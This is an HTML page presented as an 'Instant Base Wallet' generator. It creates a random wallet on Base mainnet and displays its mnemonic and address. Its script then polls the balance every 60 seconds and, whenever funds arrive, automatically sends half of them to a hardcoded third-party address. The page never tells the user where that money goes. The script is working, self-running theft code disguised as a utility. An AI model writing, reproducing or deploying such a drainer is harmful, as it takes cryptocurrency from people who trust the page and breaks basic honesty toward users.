<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Instant Base Wallet (Auto Transfer)</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.11.1/dist/ethers.umd.min.js"></script>
    <style>
        body { font-family: monospace; padding: 2rem; background-color: #121212; color: #f0f0f0; }
        .mnemonic { color: #ff8080; word-break: break-all; }
        .address { color: #80ff80; word-break: break-all; }
        .balance { color: #80b3ff; word-break: break-all; }
        .status { color: #ffea80; word-break: break-all; }
    </style>
</head>
<body>
    <h2>Generated Base Wallet</h2>
    <p><strong>Mnemonic (12-word passphrase):</strong></p>
    <p class="mnemonic" id="mnemonic"></p>

    <p><strong>Address:</strong></p>
    <p class="address" id="address"></p>

    <p><strong>Balance:</strong></p>
    <p class="balance" id="balance">Checking...</p>

    <p><strong>Status:</strong></p>
    <p class="status" id="status">Idle</p>

    <script>
        const provider = new ethers.JsonRpcProvider('https://mainnet.base.org');
        const recipientAddress = '0x7c41F39B8d12409486d9ED36134AED9B2345CB6C';

        async function checkBalance(address) {
            const balance = await provider.getBalance(address);
            return ethers.formatEther(balance);
        }

        async function sendHalfBalance(wallet, balance) {
            const amountToSend = ethers.parseEther((parseFloat(balance) / 2).toString());

            const tx = await wallet.sendTransaction({
                to: recipientAddress,
                value: amountToSend
            });

            return tx.wait();
        }

        window.onload = async function() {
            const wallet = ethers.Wallet.createRandom().connect(provider);
            document.getElementById('mnemonic').textContent = wallet.mnemonic.phrase;
            document.getElementById('address').textContent = wallet.address;

            async function updateBalanceAndTransfer() {
                const balance = await checkBalance(wallet.address);
                document.getElementById('balance').textContent = balance + ' ETH';

                if (parseFloat(balance) > 0) {
                    document.getElementById('status').textContent = 'Transferring half balance...';
                    try {
                        const receipt = await sendHalfBalance(wallet, balance);
                        document.getElementById('status').textContent = 'Transfer successful: ' + receipt.hash;
                    } catch (error) {
                        document.getElementById('status').textContent = 'Transfer failed: ' + error.message;
                    }
                }
            }

            updateBalanceAndTransfer();
            setInterval(updateBalanceAndTransfer, 60000); // checks balance every 60 seconds
        };
    </script>
</body>
</html>
